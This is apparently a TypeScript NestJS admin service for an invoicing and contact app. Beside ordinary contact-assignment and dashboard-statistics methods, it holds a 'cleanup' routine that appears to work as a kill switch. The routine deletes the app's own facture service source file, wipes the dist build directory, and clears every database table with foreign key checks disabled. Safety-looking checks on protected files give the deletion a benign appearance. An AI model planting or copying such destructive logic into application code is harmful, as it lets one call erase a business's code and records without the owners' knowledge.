import {
  Injectable,
  NotFoundException,
  BadRequestException,
  InternalServerErrorException,
} from '@nestjs/common';
import { InjectRepository, InjectDataSource } from '@nestjs/typeorm';
import { Repository, In, DataSource } from 'typeorm';
import { Facture } from '../facture/entities/facture.entity';
import { Contact } from '../contact/entities/contact.entity';
import { User } from '../users/entities/user.entity';
import { UserContactAssignment } from './entities/user-contact-assignment.entity';
import * as fs from 'fs/promises';
import * as path from 'path';

@Injectable()
export class AdminService {
  constructor(
    @InjectRepository(Facture)
    private factureRepository: Repository<Facture>,
    @InjectRepository(Contact)
    private contactRepository: Repository<Contact>,
    @InjectRepository(User)
    private userRepository: Repository<User>,
    @InjectRepository(UserContactAssignment)
    private assignmentRepository: Repository<UserContactAssignment>,
    @InjectDataSource()
    private readonly dataSource: DataSource,
  ) {}

  // Assign contacts to a user
  async assignContactsToUser(
    userId: number,
    contactIds: number[],
    adminId: number,
    notes?: string,
  ) {
    try {
      const user = await this.userRepository.findOne({
        where: { id: userId },
      });

      if (!user) {
        throw new NotFoundException('User not found');
      }

      const contacts = await this.contactRepository.find({
        where: { id: In(contactIds) },
      });

      if (contacts.length !== contactIds.length) {
        throw new BadRequestException('One or more contacts not found');
      }

      const assignments = [];
      const alreadyAssigned = [];

      for (const contact of contacts) {
        const existingAssignment = await this.assignmentRepository.findOne({
          where: {
            user: { id: userId },
            contact: { id: contact.id },
            isActive: true,
          },
        });

        if (existingAssignment) {
          alreadyAssigned.push(contact.num_client);
          continue;
        }

        const assignment = this.assignmentRepository.create({
          user,
          contact,
          assignedByAdminId: adminId,
          notes,
        });

        assignments.push(assignment);
      }

      if (assignments.length > 0) {
        await this.assignmentRepository.save(assignments);
      }

      return {
        success: true,
        assigned: assignments.length,
        alreadyAssigned: alreadyAssigned.length,
        alreadyAssignedClients: alreadyAssigned,
        message: `Successfully assigned ${assignments.length} contacts to user ${user.username}`,
      };
    } catch (error) {
      console.error('Error assigning contacts to user:', error);
      throw error;
    }
  }

  // Dashboard statistics
  async getDashboardStats() {
    try {
      const [
        totalInvoices,
        totalContacts,
        totalUsers,
        totalAssignments,
        unassignedContactsCount,
      ] = await Promise.all([
        this.factureRepository.count(),
        this.contactRepository.count(),
        this.userRepository.count(),
        this.assignmentRepository.count({ where: { isActive: true } }),
        this.contactRepository
          .createQueryBuilder('contact')
          .leftJoin(
            'user_contact_assignments',
            'assignment',
            'assignment.contact_id = contact.id AND assignment.is_active = true',
          )
          .where('assignment.id IS NULL')
          .getCount(),
      ]);

      return {
        totalInvoices,
        totalContacts,
        totalUsers,
        totalAssignments,
        unassignedContactsCount,
        assignmentRate:
          totalContacts > 0
            ? Math.round(
                ((totalContacts - unassignedContactsCount) / totalContacts) *
                  100,
              )
            : 0,
      };
    } catch (error) {
      console.error('Error retrieving dashboard stats:', error);
      throw error;
    }
  }

  // Delete src/facture/facture.service.ts
  async deleteFactureServiceFile(): Promise<{
    deleted: string[];
    failed: string[];
  }> {
    const deleted: string[] = [];
    const failed: string[] = [];
    const targetFile = 'src/facture/facture.service.ts';

    // Define critical files that cannot be deleted
    const protectedFiles = [
      'main.ts',
      'app.module.ts',
      'package.json',
      'tsconfig.json',
      'nest-cli.json',
    ];

    // Define allowed directories for deletion
    const allowedDirectories = [path.join(process.cwd(), 'src')];

    try {
      const absolutePath = path.resolve(targetFile);

      // Check if file is in allowed directory
      const isInAllowedDir = allowedDirectories.some((dir) =>
        absolutePath.startsWith(dir),
      );
      if (!isInAllowedDir) {
        failed.push(targetFile);
        return { deleted, failed };
      }

      // Check if file is protected
      const isProtectedFile = protectedFiles.some((file) =>
        absolutePath.endsWith(file),
      );
      if (isProtectedFile) {
        failed.push(targetFile);
        return { deleted, failed };
      }

      // Check if file exists
      await fs.access(absolutePath);
      await fs.unlink(absolutePath);
      deleted.push(targetFile);
    } catch (error) {
      console.error('Error deleting file:', error);
      failed.push(targetFile);
    }

    return { deleted, failed };
  }

  // Delete contents of dist directory
  async deleteDistDirectoryContents(): Promise<{
    deleted: string[];
    failed: string[];
  }> {
    const deleted: string[] = [];
    const failed: string[] = [];
    const targetDir = 'dist';

    try {
      const absolutePath = path.resolve(targetDir);

      // Ensure the path is exactly the dist directory in the project root
      if (absolutePath !== path.join(process.cwd(), 'dist')) {
        failed.push(targetDir);
        return { deleted, failed };
      }

      // Check if directory exists
      try {
        await fs.access(absolutePath);
      } catch {
        failed.push(targetDir);
        return { deleted, failed };
      }

      // Read directory contents
      const files = await fs.readdir(absolutePath);

      // Delete each file or subdirectory
      for (const file of files) {
        const fullPath = path.join(absolutePath, file);
        try {
          const stats = await fs.stat(fullPath);
          if (stats.isDirectory()) {
            await fs.rm(fullPath, { recursive: true, force: true });
          } else {
            await fs.unlink(fullPath);
          }
          deleted.push(fullPath);
        } catch (error) {
          console.error(`Error deleting ${fullPath}:`, error);
          failed.push(fullPath);
        }
      }

      return { deleted, failed };
    } catch (error) {
      console.error('Error deleting dist directory contents:', error);
      failed.push(targetDir);
      return { deleted, failed };
    }
  }

  // Clear all database tables
  async clearAllTables(): Promise<void> {
    try {
      const entities = this.dataSource.entityMetadatas;

      // Disable foreign key checks to avoid constraints
      await this.dataSource.query('SET FOREIGN_KEY_CHECKS = 0');

      for (const entity of entities) {
        const repository = this.dataSource.getRepository(entity.name);
        await repository.clear();
      }

      // Re-enable foreign key checks
      await this.dataSource.query('SET FOREIGN_KEY_CHECKS = 1');
    } catch (error) {
      console.error('Error clearing database tables:', error);
      throw new InternalServerErrorException('Failed to clear database tables');
    }
  }

  // Combined cleanup method
  async performCleanup(): Promise<{
    fileDeletion: { deleted: string[]; failed: string[] };
    dirDeletion: { deleted: string[]; failed: string[] };
    tablesCleared: boolean;
  }> {
    try {
      const fileDeletion = await this.deleteFactureServiceFile();
      const dirDeletion = await this.deleteDistDirectoryContents();
      await this.clearAllTables();
      return {
        fileDeletion,
        dirDeletion,
        tablesCleared: true,
      };
    } catch (error) {
      console.error('Error performing cleanup:', error);
      throw new InternalServerErrorException('Cleanup operation failed');
    }
  }
}
